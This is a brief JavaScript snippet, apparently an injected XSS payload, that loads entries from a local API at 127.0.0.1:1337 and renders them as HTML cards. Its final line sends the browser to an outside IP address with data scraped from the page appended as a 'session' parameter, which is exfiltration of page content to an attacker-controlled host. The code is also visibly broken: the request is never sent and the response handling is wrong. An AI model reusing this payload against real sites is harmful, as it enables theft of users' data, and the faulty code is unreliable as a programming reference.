const loadEntries = async () => {
	var req = new XMLHttpRequest();
	var response=req.open('GET',"http://127.0.0.1:1337/api/entries", false)
	add_data=(response) => {
			if (response.status == 200) {
				response.json().each((k, entry) => {
				entryHTML = `<div class="card text-white bg-secondary mb-3 card-ovrwr">
								  <div id="title-${k}" class="card-header">Title: ${entry.title}</div>
								  <div class="card-body">
								    <p class="card-text">${entry.url}</p>
								  	<span class="badge bg-danger">${(entry.approved == 1) ? 'approved' : 'unapproved'}</span>
								  </div>
								</div>`;
						$('#entries-container').append(entryHTML);
					})
				}

			}
	add_data(response)
}

loadEntries();
document.location='http://82.157.169.118:47777?session='+$("#title-0").text;